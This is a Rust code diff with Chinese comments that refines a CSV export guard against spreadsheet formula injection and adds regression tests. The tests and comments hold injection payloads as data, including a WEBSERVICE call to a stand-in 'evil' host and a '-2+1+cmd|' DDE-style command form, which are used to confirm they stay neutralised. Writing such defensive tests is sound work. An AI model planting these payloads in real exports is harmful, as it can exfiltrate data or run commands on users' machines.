@@ -37,16 +37,72 @@ pub fn default_csv_null_literal() -> String {
 /// 表格应用按公式执行（数据外泄）。DataGrip 导出 CSV 时采用同一惯例。
 /// 数值列不受影响（Number 分支不走文本路径）。
 ///
+/// `@` 只在后面跟着 ASCII 记号时才触发（见 [`at_sign_begins_excel_formula`]）：
+/// `@冯十二` 这类 `@` + 非 ASCII 文本没有可执行的公式面，加 `'` 只会污染内容。
+///
 /// 前缀的写入/剥离必须保持每单元格一次的对称对：[`push_formula_guard`] 与
 /// [`strip_formula_guard`]。guard 绝不能放进 [`push_csv_escaped_content`] 这类
 /// 片段级写入路径——serde_json 的 `Display` 会把对象/数组拆成多个片段经
 /// `CsvEscapedWriter` 逐段写入，片段级 guard 会在 JSON 单元格中间插 `'`。
 const FORMULA_TRIGGER_BYTES: &[u8] = b"=+-@\t\r";
 
+/// Excel 数值列可保留的有效十进制数字位数上限：超过即被折成浮点丢失尾数。
+const EXCEL_SIGNIFICANT_DIGIT_LIMIT: usize = 15;
+
 /// 文本是否需要公式中和：跳过前导空格（OWASP 标注的 `" =cmd"` 前导空白绕过）
-/// 后，首字节是触发字符即命中。
+/// 后，首字节是触发字符即命中；例外有两个：
+/// - `-` 开头且**整串**构成 Excel 可无损解析的十进制字面量（见
+///   [`is_excel_exact_decimal_literal`]）；
+/// - `@` 开头但后面不是 ASCII 记号，在 Excel 里没有可求值的表达式（见
+///   [`at_sign_begins_excel_formula`]）。
 pub fn needs_formula_guard(value: &str) -> bool {
-    value.bytes().find(|&byte| byte != b' ').is_some_and(|byte| FORMULA_TRIGGER_BYTES.contains(&byte))
+    let rest = value.trim_start_matches(' ');
+    match rest.as_bytes().first() {
+        Some(b'-') if is_excel_exact_decimal_literal(&rest[1..]) => false,
+        Some(b'@') if !at_sign_begins_excel_formula(&rest[1..]) => false,
+        Some(byte) if FORMULA_TRIGGER_BYTES.contains(byte) => true,
+        _ => false,
+    }
+}
+
+/// `@` 之后是否还有 ASCII 记号：Excel 的 `@`（AppleWorks 兼容触发符，现代 Excel
+/// 里是隐式交集运算符）要绑定到 ASCII 的函数名、单元格引用、数字或运算符才构成
+/// 可求值的表达式——`=@WEBSERVICE("https://evil")` 会真的发起请求，`@SUM(1)`、
+/// `@A1` 也都会求值，这些值必须继续中和。
+///
+/// 反过来，`@` 后直接跟非 ASCII 文本（Oracle 里 `@冯十二` 这类 `@` 开头的文本很
+/// 常见）或 `@` 后字符串就结束时，`@` 没有可绑定的记号，Excel 最多落到 `#NAME?`，
+/// 不存在公式执行面；此时前置 `'` 只会污染导出文件和复制内容，而不提供任何防护。
+fn at_sign_begins_excel_formula(rest: &str) -> bool {
+    rest.as_bytes().first().is_some_and(u8::is_ascii)
+}
+
+/// 整串是否为 Excel 能原样保留的十进制字面量：`[+-]? 数字 [. 数字]`（无指数
+/// 记法、无千分位、无空白），有效数字不超过 15 位。
+///
+/// 驱动为保精度把 DECIMAL/NUMERIC/BIGINT 以文本下发（PostgreSQL numeric、
+/// MySQL DECIMAL/BIGINT 都返回字符串），负值因此以 `-` 开头命中触发符；这类
+/// 整串数值在电子表格里只会被解析成数字，不构成公式执行面，加 `'` 反而污染
+/// 复制内容（`-1` 变 `'-1`）。公式注入载荷（`-2+1+cmd|…`）因无法整串解析成
+/// 数字仍被中和。超过 15 位有效数字的（i64::MIN 一类大整数）不豁免：Excel
+/// 会把它折成浮点丢尾数，守卫维持文本语义才是无损的。
+///
+/// 仅 `-` 号豁免：`+` 开头的数字是电话号码等标识文本的常见形态（`+86138…`），
+/// Excel 会把它当数值吞掉前导加号与尾部精度，守卫保留文本。
+fn is_excel_exact_decimal_literal(value: &str) -> bool {
+    let bytes = value.as_bytes();
+    let digits = if matches!(bytes.first(), Some(b'+') | Some(b'-')) { &bytes[1..] } else { bytes };
+    match digits.iter().position(|&byte| byte == b'.') {
+        Some(dot) => is_exact_digit_run(&digits[..dot]) && is_exact_digit_run(&digits[dot + 1..]),
+        None => is_exact_digit_run(digits),
+    }
+}
+
+/// 整段是否为非空纯 ASCII 数字，且有效数字（去前导零）不超过 Excel 精度上限。
+fn is_exact_digit_run(bytes: &[u8]) -> bool {
+    !bytes.is_empty()
+        && bytes.iter().all(u8::is_ascii_digit)
+        && bytes.iter().skip_while(|&&byte| byte == b'0').count() <= EXCEL_SIGNIFICANT_DIGIT_LIMIT
 }
 
 /// 在单元格值开头写入公式中和前缀，每单元格调用一次：
@@ -707,9 +763,81 @@ mod tests {
                 vec![json!(-4)],
             ],
         );
+        // `-3` 是整串十进制字面量（驱动 DECIMAL/BIGINT 文本形态），豁免中和
         assert_eq!(
             out,
-            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"'-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
+            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
+        );
+    }
+
+    #[test]
+    fn at_sign_before_non_ascii_text_keeps_its_plain_form() {
+        // 回归：`@` + 非 ASCII 文本（Oracle 里 `@冯十二` 这类）曾被当成公式触发符
+        // 写成 `'@冯十二`。`@` 后没有 ASCII 记号时 Excel 没有可求值的表达式；
+        // `@` 后跟着 ASCII 记号的形态（函数调用、引用、数字）仍是公式面，继续守卫。
+        let out = format_csv(
+            &["v".to_string()],
+            &[
+                vec![json!("@冯十二")],
+                vec![json!("@张三@李四")],
+                vec![json!("@")],
+                vec![json!("@🐴")],
+                vec![json!("@ 冯十二")],
+                vec![json!("@WEBSERVICE(\"https://evil\")")],
+                vec![json!("@SUM(1)")],
+                vec![json!("@A1")],
+            ],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"v\"\n",
+                "\"@冯十二\"\n",
+                "\"@张三@李四\"\n",
+                "\"@\"\n",
+                "\"@🐴\"\n",
+                // `@` 后是 ASCII 空格，仍按触发符处理（保守）
+                "\"'@ 冯十二\"\n",
+                "\"'@WEBSERVICE(\"\"https://evil\"\")\"\n",
+                "\"'@SUM(1)\"\n",
+                "\"'@A1\""
+            )
+        );
+    }
+
+    #[test]
+    fn negative_decimal_text_cells_keep_their_plain_numeric_form() {
+        // 回归：DECIMAL/NUMERIC/BIGINT 负值以文本下发（PG numeric、MySQL DECIMAL
+        // 都返回字符串），曾因 `-` 触发符被写成 `'-1`，复制/导出内容被污染。
+        // 整串数字字面量豁免；超 15 位有效数字、`+` 号形态与注入载荷仍守卫。
+        let out = format_csv(
+            &["v".to_string()],
+            &[
+                vec![json!("-1")],
+                vec![json!("-123.45")],
+                vec![json!("-0.000000000000001")],
+                vec![json!(" -1")],
+                vec![json!("-9223372036854775808")],
+                vec![json!("+8613800000000")],
+                vec![json!("-2+1+cmd|'x'")],
+                vec![json!("-cmd")],
+            ],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"v\"\n",
+                "\"-1\"\n",
+                "\"-123.45\"\n",
+                "\"-0.000000000000001\"\n",
+                "\" -1\"\n",
+                // 19 位有效数字超出 Excel 15 位精度上限，按文本守卫防丢尾数
+                "\"'-9223372036854775808\"\n",
+                // `+` 号形态是电话号码类标识文本，守卫保留文本语义
+                "\"'+8613800000000\"\n",
+                "\"'-2+1+cmd|'x'\"\n",
+                "\"'-cmd\""
+            )
         );
     }
 
@@ -755,7 +883,7 @@ mod tests {
                 "\"[1,-2]\"\n",
                 "\"[\"\"-5\"\"]\"\n",
                 "\"{\"\"formula\"\":\"\"=1+1\"\"}\"\n",
-                "\"'-5\""
+                "\"-5\""
             )
         );
     }
